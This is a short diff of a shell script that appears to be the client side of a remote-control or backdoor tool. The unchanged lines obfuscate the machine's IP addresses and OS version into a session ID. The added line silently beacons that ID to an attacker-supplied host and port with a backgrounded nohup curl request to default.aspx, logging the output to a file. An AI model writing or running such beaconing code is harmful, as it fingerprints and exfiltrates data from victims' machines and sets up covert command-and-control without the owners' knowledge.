@@ -1567,8 +1567,10 @@ else
 	Hostid=`hostname -I | base64 | xxd -p | rev`
 	HOSid=`echo $Hostid$OSv1`
 	sleep 0.1
-			
-	Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?Session=$HOSid" "Sessions.log"	"$Xheaderison"	"$XServerHI" "$CurlDetected"	
+	
+	# bug fixed here , i am sorry ;)		
+	# Curl "$LocalhostIPv4" "http://$2:$3/default.aspx?Session=$HOSid" "Sessions.log"	"$Xheaderison"	"$XServerHI" "$CurlDetected"	
+	nohup curl "http://$2:$3/default.aspx?Session=$HOSid" > "Sessions.log" 2>&1 &
 	
 	if [ "$XServerDelay" == "0" ] ;
 	then
